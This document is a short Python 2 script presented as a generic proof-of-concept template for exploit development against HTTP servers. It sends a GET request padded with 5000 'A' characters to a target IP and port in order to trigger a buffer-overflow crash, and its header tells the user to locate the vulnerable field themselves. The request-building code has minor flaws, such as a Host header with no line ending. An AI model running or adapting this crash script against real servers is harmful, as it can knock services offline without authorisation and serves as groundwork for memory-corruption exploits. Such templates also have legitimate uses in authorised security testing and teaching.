#!/usr/bin/python
''' 
Content:	exploitDev PoC template for HTTP targets
Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
Date: 		02/2018
	
Usage:		python http.py targetIP targetPort
Note:		This is just a generic template, you have to find the vulnerable option by yourself and change the position of crash
		
'''
import socket
import os
import sys



if len(sys.argv) != 3:
	print "Usage: python http.y targetIP targetPort"
else:
	ip = sys.argv[1]
	port = int(sys.argv[2])

	crash = "A" * 5000


	buffer="GET\n"
	buffer+=crash
	buffer+=" HTTP/1.1\r\n"
	buffer+="Host: "
	buffer+=ip
	buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
	buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
	buffer+="Content-Length: 1048580\r\n\r\n"

	print "[*] Sending evil http request to target"
	expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	expl.connect((ip, port))
	expl.send(buffer)
	expl.close()
	




